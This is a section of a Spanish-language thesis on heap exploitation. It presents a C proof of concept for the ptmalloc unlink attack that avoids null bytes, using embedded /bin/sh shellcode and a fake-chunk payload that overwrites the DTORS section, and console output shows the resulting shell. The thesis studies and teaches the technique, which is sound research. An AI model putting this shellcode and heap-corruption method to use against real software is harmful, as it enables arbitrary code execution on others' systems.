\subsubsection{Construcción de la prueba de concepto sin bytes nulos}


Este apartado va a ser mucho menos extenso que el \ref{sec:const_pof}. debido a que el concepto es el mismo con la única diferencia que el \textit{payload} ha cambiado. El Código \ref{code:ptmalloc_exploit_2} muestra la nueva prueba de concepto. \bigskip

\lstset{language=C, caption=Exploit para el algoritmo ptmalloc sin bytes nulos , label=code:ptmalloc_exploit_2}
\begin{lstlisting}
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define VULN 		"./vuln"
#define PAYLOAD_SIZE	531

void world_destruction() __attribute__((destructor));
void build_payload (char *, void *);

char shellcode[]= 	/* jmp 12 + 12 nops */
			"\xeb\x0a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
			/* shellcode by vlan7 and sch3m4 */
			"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9"
			"\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
			"\x69\x8d\x41\x0b\x89\xe3\xcd\x80";

int main(int argc, char ** argv) {
	
	int status;
	char crafted_data[700] = {0};
	
	
	/* Obtain the page size of the system */
	int pagesize = sysconf(_SC_PAGE_SIZE);
	if ( pagesize == -1) {
		perror("[-] Page size could not be obtained");
		exit(EXIT_FAILURE);
	}
	/* Obtain an aligned memory region in order to mprotect it */
	void * real_shell;
	if ( posix_memalign(&real_shell, pagesize, sizeof(shellcode)) ) {
		perror("[+] Aligned memory could not be obtained");
		exit(EXIT_FAILURE);
	}
	/* Copy the shellcode to the executable region obtained with memalign */
	memcpy(real_shell, shellcode, sizeof(shellcode));
	/* Making  shellcode location executable */
	mprotect(real_shell, pagesize, PROT_WRITE | PROT_EXEC);
	/* Making DTORS section writable */
	mprotect((void*)0x8049000, pagesize, PROT_WRITE);
	/* The payload is built */
	build_payload(crafted_data, real_shell);

	
	char * ptr_1 = (char *) malloc (512);
	char * ptr_2 = (char *) malloc (512);

	memcpy(ptr_1, crafted_data, PAYLOAD_SIZE);

	free(ptr_1);
	free(ptr_2);	
	
	return 0;
}

void build_payload(char * crafted_data, void * sc_addr) {

	char str_dtor_ptr[5] = {0};
	char * seek = crafted_data;
	
	/* Trash */
	memset(seek, '@', 492); 
	seek += 492;
	/* Size of the second fake chunk */
	/* if the PREV_INUSE bit is set, the unlink is not triggered */
	/* in the second free()*/
	memcpy(seek, "\x41@@@", 4);
	seek += 4;
	/* prev_size of fake chunk. */
	memcpy(seek, "@@@@", 4);
	seek += 4;
	/* size of fake chunk. PREV_INUSE bit unset. -8 value */
	/* triggers unlink in the nextinuse of the first free() */
	memcpy(seek, "\xf8\xff\xff\xff", 4);
	seek += 4;
	/* fd of fake chunk */
	memcpy(seek, "@@@@", 4);
	seek += 4;
	/* bk of fake chunk */
	memcpy(seek, "@@@@", 4);
	seek += 4;
	/* prev_size of second freed chunk. */
	memcpy(seek, "@@@@", 4);
	seek += 4;
	/* size of second freed chunk. Hexadecimal -16 value */
	/* PREV_INUSE bit set. Avoid consolidate backward (unlink) on 2nd free */
	memcpy(seek, "\xf1\xff\xff\xff", 4);
	seek += 4;
	/* fd of second freed chunk. dtors_end - 12 */
	memcpy(str_dtor_ptr, "\x10\x9f\x04\x08", 4);
	memcpy(seek, str_dtor_ptr, 4);
	seek += 4;
	/* bk of second freed chunk. Shellcode address */	
	memcpy(seek, &sc_addr, 4);
	seek += 4;
}

void world_destruction() {}
\end{lstlisting}

Debido a la complejidad del código o, al menos, del \textit{payload}, éste está mucho más comentado, detallando el por qué de cada una de sus partes. Los comentarios son una especie de resumen del apartado anterior. \bigskip

Al ejecutar el código, del mismo modo que con el código anterior, se obtiene una línea de comandos: \bigskip

\begin{listing}[style=consola, caption=Ejecución de la prueba de concepto sin bytes nulos, label=out:pof_3]
newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ gcc pof_without_null_bytes.c -o pof_without_null_bytes -g
newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ ./pof_without_null_bytes 
$ id
uid=1000(newlog) gid=1000(newlog) groups=1000(newlog),4(adm),20(dialout),24(cdrom),46(plugdev),111(lpadmin),119(admin),122(sambashare)
$ exit
newlog@ubuntu:~/Documents/TFM/Heap/heap_exploiting/codes/unlink/ptmalloc2_test$ 
\end{listing}